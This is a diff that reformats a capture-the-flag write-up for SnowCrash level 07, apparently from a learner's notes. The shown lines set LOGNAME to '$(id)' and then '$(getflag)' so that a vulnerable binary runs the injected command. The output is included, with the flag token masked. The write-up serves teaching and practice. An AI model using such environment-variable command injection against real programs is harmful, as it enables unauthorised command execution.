@@ -28,7 +28,7 @@ In level 07, we exploit a binary file (`level07`) that prints the `LOGNAME` envi
    ```
     The program simply prints the LOGNAME variable.
 
-2. Identifying Command Injection:
+2. **Identifying Command Injection**:
     We discover that the program evaluates the LOGNAME variable, allowing for command injection. We export the LOGNAME variable with a command to execute:
     ```sh
     level07@SnowCrash:~$ LOGNAME="\$(id)"; ./level07 
@@ -36,13 +36,13 @@ In level 07, we exploit a binary file (`level07`) that prints the `LOGNAME` envi
     ```
     The command id is executed, revealing the user's identity.
 
-3. Exploiting Command Injection:
+3. **Exploiting Command Injection**:
     We exploit the command injection to execute the getflag command:
     ```sh
     level07@SnowCrash:~$ LOGNAME="\$(getflag)"; ./level07 
     Check flag. Here is your token : ***************************************
     ```
-    The getflag command is executed, and we obtain the flag.
+    The `getflag` command is executed, and we obtain the flag.
 
 ## Conclusion
 
